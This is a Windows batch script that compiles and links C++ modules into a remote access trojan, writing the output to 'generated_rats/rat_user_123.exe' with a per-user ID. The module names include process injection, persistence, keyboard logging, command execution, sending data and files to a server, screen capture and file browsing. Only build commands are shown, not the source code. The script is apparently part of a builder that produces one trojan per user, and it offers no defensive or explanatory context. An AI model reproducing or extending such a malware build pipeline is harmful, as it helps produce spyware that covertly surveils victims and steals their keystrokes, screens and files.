@echo off
cd /d "C:\Users\Administrator\Desktop\CLI C+ Root/rootserver"
g++ -c injection.cpp -o injection.o -lpsapi
g++ -c persistence.cpp -o persistence.o -ladvapi32
g++ -c keyboard.cpp -o keyboard.o -luser32
g++ -c utils.cpp -o utils.o -lpsapi
g++ -c exec_command.cpp -o exec_command.o
g++ -c send_to_server.cpp -o send_to_server.o
g++ -c send_file.cpp -o send_file.o
g++ -c screen_capture.cpp -o screen_capture.o -lgdi32 -lgdiplus -ld3d11 -ldxgi
g++ -c file_browser.cpp -o file_browser.o
g++ -c process_utils.cpp -o process_utils.o -lpsapi
g++ -c main.cpp -o main.o -I. -lpsapi -DUSER_ID=123
windres app.rc -O coff -o app.res
g++ -o "C:\Users\Administrator\Desktop\CLI C+ Root/generated_rats/rat_user_123.exe" app.res main.o injection.o persistence.o keyboard.o utils.o exec_command.o send_to_server.o send_file.o screen_capture.o file_browser.o process_utils.o -lpsapi -ladvapi32 -luser32 -lkernel32 -lws2_32 -lgdi32 -lgdiplus -ld3d11 -ldxgi -lshlwapi -lole32 -static -std=c++11
